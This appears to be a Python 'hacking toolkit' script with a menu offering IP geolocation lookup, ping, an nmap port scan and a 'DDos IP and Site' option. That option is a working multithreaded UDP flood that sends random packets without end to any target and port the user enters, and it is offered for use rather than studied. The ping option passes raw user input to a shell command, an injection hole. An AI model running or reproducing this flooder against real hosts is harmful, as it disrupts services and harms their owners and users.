import socket
import os
import random
import time
import threading
from time import sleep
from os import system
import requests
import nmap
import ipaddress
import platform
import sys

def get_ip_address(domain):
    try:
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        return None
      
def get_ipv4_address():
    try:
        hostname = socket.gethostname()
        ipv4_address = socket.gethostbyname(hostname)
        return ipv4_address
    except:
        return "Not found"

def get_ipv6_address():
    try:
        ipv6_address = requests.get('https://api6.ipify.org').text
        return ipv6_address
    except:
        return "Not found"

def get_public_ip():
    try:
        public_ip = requests.get('https://api.ipify.org').text
        return public_ip
    except:
        return "Not found"
    

if platform.system() == "Windows":
    os.system("cls")
else:
    os.system("clear")

def main():
    white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(3500)
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

B = '\033[35m'
R = '\033[31m'
N = '\033[0m'
A = '\033[34m'

print("")
print(f"""{B}
                                                                                                                                             
    ▄▄▄▄   ▄▄    ▄▄    ▄▄▄▄    ▄▄    ▄▄  ▄▄        ▄▄    ▄▄   ▄▄▄▄▄   
  ██▀▀▀▀█  ██    ██   ██▀▀██   ██    ██  ██        ▀██  ██▀  █▀▀▀▀██▄ 
 ██        ██    ██  ██    ██  ██    ██  ██         ██  ██         ██ 
 ██  ▄▄▄▄  ████████  ██    ██  ██    ██  ██         ██  ██       ▄█▀  
 ██  ▀▀██  ██    ██  ██    ██  ██    ██  ██          ████      ▄█▀    
  ██▄▄▄██  ██    ██   ██▄▄██   ▀██▄▄██▀  ██▄▄▄▄▄▄    ████    ▄██▄▄▄▄▄ 
    ▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀▀▀▀    ▀▀▀▀    ▀▀▀▀▀▀▀▀
                          [Made By JJ Joost]                                    
                           [Version: 2.0.0]
        ╔══╦═════════════════════════╦══╦════════════════════════╗
        ║01║IP Lookup                ║05║In Progress             ║                                      
        ║02║DDos IP and Site         ║06║In Progress             ║ 
        ║03║Ping IP                  ║07║In Progress             ║
        ║04║Port Scanner             ║08║Exit                    ║
        ╚══╩═════════════════════════╩══╩════════════════════════╝
      """)

print()

Choice = input("Enter your choice :")

if Choice == "1":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False

        def get_ip_info():
            ip_address = input(R + "[" + B + "+" + R + "] " + R + "Enter the IP address : " + B)
            print(B + B + "[" + A + "$" + B + "] " + B + "Getting some info...")
            sleep(2)

            if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()

            response = requests.get(f"http://ip-api.com/json/{ip_address}")

            if response.status_code != 200:
                print(R + "[" + B + "!" + R + "] " + R + "Cannot find the ip address")
                sleep(3)
                main()

            data = response.json()

            print(B + "\n╭ " + R + "IP ADDRESS : " + ip_address)
            print(B + "├ " + R + "STATE : ", data.get('regionName', 'N/A'))
            print(B + "├ " + R + "ORGANIZATION : ", data.get('org', 'N/A'))
            print(B + "├ " + R + "ISP : ", data.get('isp', 'N/A'))
            print(B + "├ " + R + "CITY : ", data.get('city', 'N/A'))
            print(B + "├ " + R + "COUNTRY : ", data.get('country', 'N/A'))
            print(B + "├ " + R + "COUNTRY ISO : ", data.get('countryCode', 'N/A'))
            print(B + "├ " + R + "POSTAL CODE : ", data.get('zip', 'N/A'))
            print(B + "├ " + R + "LATITUDE : ", data.get('lat', 'N/A'))
            print(B + "├ " + R + "LONGITUDE : ", data.get('lon', 'N/A'))

            if 'lat' in data and 'lon' in data:
                print(B + "╰ " + R + "LOCATION : ", f"https://www.google.com/maps/?q={data['lat']},{data['lon']}")
                
            main_menu = input(R + "\nWanna go back to the main menu (Y/N) ? ")
            
            if main_menu == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "N":
                sleep(2)
                exit()

            elif main_menu == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

        get_ip_info()

elif Choice == "2":


            

        def DoS(ip, port, size, index):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while True:
                sock.sendto(random._urandom(size), (ip, port))
                print(f"{R}[{B}THREAD {index}{R}] {R}\xBB {B}{size} {R}bytes sent to {B}{ip}\033[0m")

        def mainv4():
            
            
                
            IP       = input(R + "[" + B + "+" + R + "] " + R + "Target's IP or Website Domain : " + B) if len(sys.argv) < 2 else sys.argv[1]
            PORT     = int(input(R + "[" + B + "+" + R + "] " + R + "Target's Port : " + B)) if len(sys.argv) < 3 else int(sys.argv[2])
            SIZE     = int(input(R + "[" + B + "+" + R + "] " + R + "Packet Size : " + B)) if len(sys.argv) < 4 else int(sys.argv[3])
            COUNT    = int(input(R + "[" + B + "+" + R + "] " + R + "Enter How Many Threads to Use : " + B)) if len(sys.argv) < 5 else int(sys.argv[4])


            if PORT > 65535 or PORT < 1:
                print(f"\n{R}[{B}!{R}]{R} {R}\xBB Please choose a port between 1 and 65535")
                time.sleep(3)
                main()

            if SIZE > 65500 or SIZE < 1:
                print(f"\n{R}[{B}!{R}]{R} {R}\xBB Please choose a packet size between 1 and 65500")
                time.sleep(3)
                main()

            for i in range(COUNT):
                try:
                    t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
                    t.start()
                except Exception as e:
                    print(f"\n{R}[{B}!{R}]{R} {R}\xBB An error ocurred initializing thread {i}: {e}")            

        if __name__ == "__main__":
            mainv4()

elif Choice == "3":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
            
        ipA = input(R + "[" + B + "+" + R + "] " + R + "Target's IP : " + B)
        print(B + B + "[" + A + "$" + B + "] " + B + "Pinging...")
        sleep(2)

        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()
        lpingip = f"ping -w 1000 {ipA}"
        pingip = "ping -t -w 1000 " + "" + ipA
        if platform.system() == "Windows":
            os.system("cls")
            print(R)
            system(pingip)
        else:
            os.system("clear")
            print(R)
            system(lpingip)
        sleep(100)


elif Choice == "4":
        def is_valid_ip(ip_address):
            try:
                ipaddress.IPv4Address(ip_address)
                return True
            except ipaddress.AddressValueError:
                return False

        def scan_ports(ip_address):
            if not is_valid_ip(ip_address):
                print(f"{R}[{B}!{R}] Invalid IP address.")
                return

            nm = nmap.PortScanner()
            scan_result = nm.scan(ip_address, arguments='-F') 

            open_ports = []
            closed_ports = []
            filtered_ports = []

            if 'scan' in scan_result and ip_address in scan_result['scan']:
                for target_port in scan_result['scan'][ip_address]['tcp']:
                    state = scan_result['scan'][ip_address]['tcp'][target_port]['state']
                    if state == 'open':
                        open_ports.append(target_port)
                    elif state == 'closed':
                        closed_ports.append(target_port)
                    elif state == 'filtered':
                        filtered_ports.append(target_port)

            if open_ports:
                print(f"\n{R}[{B}?{R}] Open ports : " + ', '.join(str(port) for port in open_ports))
            else:
                print(f"\n{R}[{B}?{R}] No open ports found.")

            if closed_ports:
                print(f"{R}[{B}?{R}] Closed ports : {', '.join(str(port) for port in closed_ports)}")
            else:
                print(f"{R}[{B}?{R}] No closed ports found.")

            if filtered_ports:
                print(f"{R}[{B}?{R}] Filtered ports : {', '.join(str(port) for port in filtered_ports)}")
            else:
                print(f"{R}[{B}?{R}] No filtered ports found.")

        if __name__ == "__main__":
            target_ip = input(R + "[" + B + "+" + R + "] Enter The Device IP : " + B)  
            scan_ports(target_ip)

        main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

        if main_menu2 == "Y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "N":
            sleep(2)
            exit()

        elif main_menu2 == "y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "n":
            sleep(2)
            exit()
            
        else :
            sleep(2)
            exit()

elif Choice == "7":
    print(B + B + "[" + A + "$" + B + "] " + B + "This feature is still in development...")
    time.sleep(3)

    main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

    if main_menu2 == "Y" or main_menu2 == "y":
        print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
        sleep(2)
        main()

    elif main_menu2 == "N" or main_menu2 == "n":
        sleep(2)
        exit()

    else:
        sleep(2)
        exit()


elif Choice == "7":
    print(B + B + "[" + A + "$" + B + "] " + B + "This feature is still in development...")
    time.sleep(3)

    main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

    if main_menu2 == "Y" or main_menu2 == "y":
        print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
        sleep(2)
        main()

    elif main_menu2 == "N" or main_menu2 == "n":
        sleep(2)
        exit()

    else:
        sleep(2)
        exit()


elif Choice == "5":
    print(B + B + "[" + A + "$" + B + "] " + B + "This feature is still in development...")
    time.sleep(3)

    main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

    if main_menu2 == "Y" or main_menu2 == "y":
        print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
        sleep(2)
        main()

    elif main_menu2 == "N" or main_menu2 == "n":
        sleep(2)
        exit()

    else:
        sleep(2)
        exit()


elif Choice == "5":
    print(B + B + "[" + A + "$" + B + "] " + B + "This feature is still in development...")
    time.sleep(3)

    main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

    if main_menu2 == "Y" or main_menu2 == "y":
        print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
        sleep(2)
        main()

    elif main_menu2 == "N" or main_menu2 == "n":
        sleep(2)
        exit()

    else:
        sleep(2)
        exit()

elif Choice == "8":
    print(B + B + "[" + A + "$" + B + "] " + B + "Exiting...")
    sleep(2)
    exit()
